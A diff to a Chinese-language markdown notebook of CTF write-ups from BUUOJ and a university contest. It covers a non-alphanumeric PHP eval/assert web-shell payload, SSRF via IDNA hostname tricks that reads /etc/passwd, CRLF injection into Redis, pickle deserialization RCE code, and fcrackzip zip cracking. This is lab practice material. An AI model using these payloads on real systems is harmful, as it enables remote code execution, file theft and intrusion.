@@ -7742,69 +7742,6 @@ def challenge():
 
 ![image-20240425000642878](CTF.assets/image-20240425000642878.png)
 
-
-
-# Misc
-
-## János-the-Ripper-隐写-压缩包密码破解
-
-发现一个压缩文件在里面
-
-```bash
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
-└─$ binwalk misc100 
-
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 39, uncompressed size: 25, name: flag.txt
-131           0x83            End of Zip archive, footer length: 22
-
-```
-
-`foremost`导出来，里面有一个加密的压缩文件
-
-```bash
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
-└─$ foremost misc100
-Processing: misc100
-|foundat=flag.txt
-*|
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
-└─$ ls
-00000000.zip
-
-```
-
-`fcrackzip`爆破密码
-
-```bash
-# -b 爆破 -c 指定字符集为小写字母 -l 指定长度 -u 过滤错误密码
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
-└─$ fcrackzip -b -c 'a' -l 4 -u 00000000.zip 
-
-
-PASSWORD FOUND!!!!: pw == fish
-
-```
-
-解压缩得到密码
-
-```bash
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
-└─$ unzip 00000000.zip 
-Archive:  00000000.zip
-[00000000.zip] flag.txt password: 
-  inflating: flag.txt                
-                                                                                                                                                    
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
-└─$ ls
-00000000.zip  flag.txt
-                                                                                                                                                    
-┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
-└─$ cat flag.txt 
-flag{ev3n::y0u::bru7us?!} 
-```
-
 ## BUUOJ [GWCTF 2019]我有一个数据库
 
 > 参考链接：https://blog.csdn.net/qq_45521281/article/details/105780497
@@ -7925,6 +7862,407 @@ print(req.text)
 ```
 
 最后直接在浏览器访问这个链接：`http://69b82027-d496-4ad5-8b6f-dbf95b056356.node5.buuoj.cn:81/flflflflag.php?file=/tmp/phpTkQIkF`并抓相应包就能看到FLAG了，不要用Burp Suite的重放，相应包好像回不来
+
+## BUUOJ [极客大挑战 2019]RCE ME1
+
+明显的RCE考点，无字母数组绕过
+
+```php
+<?php
+error_reporting(0);
+if (isset($_GET['code'])) {
+    $code = $_GET['code'];
+    if (strlen($code) > 40) {
+        die("This is too Long.");
+    }
+
+    if (preg_match("/[A-Za-z0-9]+/", $code)) {
+        die("NO.");
+    }
+    var_dump($code);
+    eval($code);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+两个思路：异或绕过和取反绕过，由于限制了长度是40个字符，这里一般情况取反绕过会更短~
+
+用scandir扫了一下发现有一个readflag，那么就必须调用PHP能指向系统命令的函数，可以`phpinfo`可以看到基本上所有能用的函数都被过滤掉了，最后最简单的方法就是上蚁剑的插件了
+
+```
+# var_dump(scandir('/'));
+(~'%89%9E%8D%A0%9B%8A%92%8F')((~('%8C%9C%9E%91%9B%96%8D'))('/'));
+```
+
+<img src="CTF.assets/image-20240506004035326.png" alt="image-20240506004035326" style="zoom:67%;" />
+
+
+
+一开始的思路是构造`eval(eval())`，但是一直报错，说`eval`是未定义函数，后面GPT了一下说`eval()`是语法而不是函数，所以只能用`assert`去接收
+
+```php
+# POC代码
+<?php
+$a = 'assert';
+$b = urlencode(~$a);
+echo $b;
+echo "\n";
+$c = '(eval($_POST[cmd]))';
+$d=urlencode(~$c);
+echo $d;
+
+# payload：
+(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);
+```
+
+确定PHP版本为7的基础上，每个模式都试一试
+
+![image-20240506004227025](CTF.assets/image-20240506004227025.png)
+
+## BUUOJ [SUCTF 2019]Pythonginx 1
+
+```python
+@app.route('/getUrl', methods=['GET', 'POST'])
+def getUrl():
+    url = request.args.get("url")
+    host = parse.urlparse(url).hostname
+    if host == 'suctf.cc':
+        return "我扌 your problem? 111"
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == 'suctf.cc':
+        return "我扌 your problem? 222 " + host
+    newhost = []
+    for h in host.split('.'):
+        newhost.append(h.encode('idna').decode('utf-8'))
+    parts[1] = '.'.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(' ')[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == 'suctf.cc':
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return "我扌 your problem? 333"
+    
+# 整理后得：
+from urllib.parse import *
+import urllib.request
+
+url = 'http://𝐒uctf.cc'
+host = urlparse(url).hostname
+if host == 'suctf.cc':
+    exit("我扌 your problem? 111")
+parts = list(urlsplit(url))
+host = parts[1]
+if host == 'suctf.cc':
+    exit("我扌 your problem? 222 " + host)
+newhost = []
+for h in host.split('.'):
+    newhost.append(h.encode('idna').decode('utf-8'))
+parts[1] = '.'.join(newhost)
+# 去掉 url 中的空格
+finalUrl = urlunsplit(parts).split(' ')[0]
+host = urlparse(finalUrl).hostname
+if host == 'suctf.cc':
+    print("Success")
+    print(host)
+    # exit(urllib.request.urlopen(finalUrl).read())
+else:
+    exit("我扌 your problem? 333")
+
+```
+
+这里一开始的思路是绕过`urlparse`，后面发现搞错了
+
+```
+而这利用的关键在于newhost.append(h.encode('idna').decode('utf-8'))
+编码问题，Unicode的很多字符经过这样的一番编码处理都可以得到正常的字母
+```
+
+```py
+chars = ['s', 'u', 'c', 't', 'f']
+for c in chars:
+	for i in range(0x7f, 0x10FFFF):
+		try:
+			char_i = chr(i).encode('idna').decode('utf-8')
+			if char_i == c:
+				print('ASCII: {}   Unicode: {}    Number: {}'.format(c, chr(i), i))
+		except:
+			pass
+```
+
+`urllib.request.urlopen`是一个明显的SSRF漏洞，可以直接用`file://`读取文件
+
+```
+getUrl?url=file://𝐒uctf.cc/../../../../../../etc/passwd
+```
+
+![image-20240506013623017](CTF.assets/image-20240506013623017.png)
+
+```
+nginx重要文件的位置：　
+　　　　配置文件存放目录：/etc/nginx
+　　　　主配置文件：/etc/nginx/conf/nginx.conf
+　　　　管理脚本：/usr/lib64/systemd/system/nginx.service
+　　　　模块：/usr/lisb64/nginx/modules
+　　　　应用程序：/usr/sbin/nginx
+　　　　程序默认存放位置：/usr/share/nginx/html
+　　　　日志默认存放位置：/var/log/nginx
+　　　　配置文件目录为：/usr/local/nginx/conf/nginx.conf
+```
+
+```
+getUrl?url=file://𝐒uctf.cc/../../../../../../usr/local/nginx/conf/nginx.conf
+```
+
+![image-20240506013656198](CTF.assets/image-20240506013656198.png)
+
+```
+getUrl?url=file://𝐒uctf.cc/../../../../../../usr/fffffflag
+```
+
+![image-20240506013728307](CTF.assets/image-20240506013728307.png)
+
+## 高校网络安全管理运维赛 pyssrf
+
+> 考点：SSRF + Redis + python pickle 反序列化
+
+### CRLF HTTP 注入
+
+```
+参考：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
+```
+
+大概思路就是通过`\r\n`大回车去分割HTTP报头，然后某些服务，如Redis的协议就刚好可以理解这种被`\r\n`修改的报文
+
+SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如`http://127.0.0.1:80`：
+
+```
+GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
+Host: localhost
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+```
+
+可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回`did not have a valid SOAP content-type`。
+
+### Python pickle
+
+> 参考：https://tttang.com/archive/1885/#toc__8
+
+大概思路就是类似于PHP的`unserialize`和`serialize`，但是跟PHP的最大的区别就是PHP需要利用已有的类做反序列化执行相应的操作，而pickle只要有`loads`就能执行任意函数甚至是RCE。pickle的反序列化的字符串的生成有两种方式
+
++ 方式一：
+
+  ```py
+  import pickle
+  import base64
+  
+  class A(object):
+      def __reduce__(self):
+          # eval 函数执行
+          return (eval, (r"__import__('os').popen('cat /flag').read()",))
+  
+  a = A()
+  a = pickle.dumps(a)
+  print(a)
+  print(base64.b64encode(a))
+  
+  # pickle.loads(b"\x80\x03cbuiltins\neval\nq\x00XH\x00\x00\x00__import__('os').popen('type C:\\Users\\19374\\Desktop\\CTF\\123.txt').read()q\x01\x85q\x02Rq\x03.")
+  
+  ```
+
++ 方式二：手戳opcode
+
+  ```py
+  import base64
+  import pickle
+  
+  opcode = b'''cos
+  system
+  (S'whoami'
+  tRcos
+  system
+  (S'whoami'
+  tR.'''
+  
+  b64_opcode = base64.b64encode(opcode)
+  print(b64_opcode)
+  pickle.loads(base64.b64decode(b64_opcode))
+  print(type(pickle.loads(base64.b64decode(b64_opcode))))
+  
+  # pickle.loads(opcode)
+  ```
+
+### 例题
+
+脚本大致流程是：获取URL并返回给函数`get_result`，将url做哈希作为写入redis的key：`url_key`，将请求的结果序列化后base64编码返回作为redis的值：`b64res`；得到的url先查询Redis的缓存，如果存在，则base64解码、反序列化并将结果返回到前端，否则，发送请求获取结果并将结果base64编码存入redis，将明文返回到前端
+
+```py
+from flask import Flask, request
+from redis import Redis
+import hashlib
+import pickle
+import base64
+import urllib
+
+app = Flask(__name__)
+redis = Redis(host='127.0.0.1', port=6379)
+
+
+def get_result(url):
+    print("=====================================================================")
+    url_key = hashlib.md5(url.encode()).hexdigest()
+    print(url_key)
+    res = redis.get(url_key)
+    print('res', res)
+    if res:
+        print("redis 缓存读取成功")
+        # 从data中读取二进制字节流，将其反序列化为一个对象并返回。
+        print(type(pickle.loads(base64.b64decode(res))))        # 返回 int class
+        print(pickle.loads(base64.b64decode(res)))
+        return pickle.loads(base64.b64decode(res))
+    else:
+        try:
+            print(url)
+            info = urllib.request.urlopen(url)
+            res = info.read()
+            # 将 obj 打包以后的对象作为bytes类型直接返回。
+            pickres = pickle.dumps(res)
+            print(pickres)
+            b64res = base64.b64encode(pickres)
+            redis.set(url_key, b64res, ex=300)
+            return res
+        except urllib.error.URLError as e:
+            print(e)
+
+
+@app.route('/')
+def hello():
+    url = request.args.get("url")
+    return '''<h1>give me your url via GET method like: ?url=127.0.0.1:8080<h1>
+        <h2>Here is your result</h2>
+        <h3>source code in /source</h3>
+        %s
+        ''' % get_result('http://' + url).decode(encoding='utf8', errors='ignore')
+
+
+@app.route('/source')
+def source():
+    return
+
+
+if __name__ == '__main__':
+    app.run(debug=True, host="0.0.0.0")
+```
+
+解题思路：首先可以确定的是利用`loads`做反序列化RCE，但是反序列化的字符串`b64res`是通过` urllib.request.urlopen(url)`获取的，所以这里看起来貌似`b64res`是不可控的！矛盾点就在这里！！！需要想办法去控制`b64res`的值
+
+这里首先要做的是构造出反序列化字符串
+
+```python
+import pickle
+import base64
+
+class A(object):
+    def __reduce__(self):
+        # 由于模板做了 decode 解码，所以这里读取完后需要加上 encode 编码，返回 Byte 对象
+        return (eval, ("__import__('os').popen('cat /flag').read().encode()",))
+
+a = A()
+a = pickle.dumps(a)
+print(a)
+print(base64.b64encode(a))
+print(pickle.loads(b"\x80\x04\x95F\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c*__import__('os').popen('tac /flag').read()\x94\x85\x94R\x94."))
+```
+
+将拿到的反序列化字符串做base64编码，写入CRLF的payload，其中哈希`8aa27f620091079a9ce925ac4ffe233c = http://127.0.0.1:8888` 
+
+```
+127.0.0.1%3A6379%2Ftest%0A%0Aset%208aa27f620091079a9ce925ac4ffe233c%20%22gASVTwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwzX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgpLmVuY29kZSgplIWUUpQu%22%0Asave%0A%0Aaaa
+
+# URL 解码
+127.0.0.1:6379/test
+
+set 8aa27f620091079a9ce925ac4ffe233c "gASVTwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwzX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgpLmVuY29kZSgplIWUUpQu"
+save
+
+aaa
+```
+
+SSRF发送CRLF报文，建立键值对
+
+![image-20240506202458129](CTF.assets/image-20240506202458129.png)
+
+访问`http://127.0.0.1:`
+
+![image-20240506202521482](CTF.assets/image-20240506202521482.png)
+
+
+
+# Misc
+
+## János-the-Ripper-隐写-压缩包密码破解
+
+发现一个压缩文件在里面
+
+```bash
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
+└─$ binwalk misc100 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 39, uncompressed size: 25, name: flag.txt
+131           0x83            End of Zip archive, footer length: 22
+
+```
+
+`foremost`导出来，里面有一个加密的压缩文件
+
+```bash
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
+└─$ foremost misc100
+Processing: misc100
+|foundat=flag.txt
+*|
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
+└─$ ls
+00000000.zip
+
+```
+
+`fcrackzip`爆破密码
+
+```bash
+# -b 爆破 -c 指定字符集为小写字母 -l 指定长度 -u 过滤错误密码
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
+└─$ fcrackzip -b -c 'a' -l 4 -u 00000000.zip 
+
+
+PASSWORD FOUND!!!!: pw == fish
+
+```
+
+解压缩得到密码
+
+```bash
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
+└─$ unzip 00000000.zip 
+Archive:  00000000.zip
+[00000000.zip] flag.txt password: 
+  inflating: flag.txt                
+                                                                                                                                                    
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
+└─$ ls
+00000000.zip  flag.txt
+                                                                                                                                                    
+┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
+└─$ cat flag.txt 
+flag{ev3n::y0u::bru7us?!} 
+```
 
 
 
